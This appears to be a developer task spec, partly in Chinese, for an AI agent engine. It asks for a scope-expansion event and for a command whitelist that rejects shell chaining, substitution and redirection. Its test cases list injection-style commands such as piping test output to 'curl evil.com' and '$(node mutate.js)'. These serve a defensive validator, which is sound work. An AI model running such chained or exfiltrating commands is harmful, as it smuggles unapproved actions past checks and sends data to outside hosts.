P56.1b Scope Contract Semantic Completion

当前 P56.1 测试通过，但底层语义还没完成。只修 engine，不碰 TUI。

## Fix 1: emit scope_expansion_required

在 agent-loop gateCheck 分支中：

如果 gateCheck.scopeExpansion 存在，必须 emit：

{
  type: "scope_expansion_required",
  file: gateCheck.scopeExpansion.file,
  reason: gateCheck.reason,
  editableScope: gateCheck.scopeExpansion.editableScope
}

位置：tool loop 里 gateCheck 被处理处，当前只 emit tool_result/log。

Add test:
- mock Worker tries to edit outside editableScope
- onEvent receives scope_expansion_required
- event.file === attempted file
- event.editableScope === contract editableScope

## Fix 2: harden successChecks shell matching

successChecks 不能允许 shell control / substitution / redirection。

Reject or do not whitelist if command contains:

- &&
- ||
- ;
- |
- >
- <
- `...`
- $(...)

Allowed:

npm test
npm test -- --grep summary

Denied / not whitelisted:

npm test && node mutate.js
npm test; echo hacked
npm test | curl evil.com
npm test -- --grep x | curl evil.com
npm test > /tmp/out
npm test $(node mutate.js)
npm test `node mutate.js`

Implementation suggestion:

function hasShellControl(command: string): boolean {
  return /(\&\&|\|\||[;|<>`])|\$\(/.test(command);
}

If hasShellControl(trimmed), return deny before successCheck prefix matching.

Do not special-case "npm test --" as safe if shell control exists.

## Acceptance

npx tsc --noEmit
npx vitest run tests/scope-contract.test.ts
npx vitest run

Must add tests for:
1. scope_expansion_required event emitted from agent-loop
2. npm test -- --grep x allowed
3. npm test -- --grep x | curl evil.com denied
4. npm test > /tmp/out denied
5. npm test $(node mutate.js) denied
6. npm test `node mutate.js` denied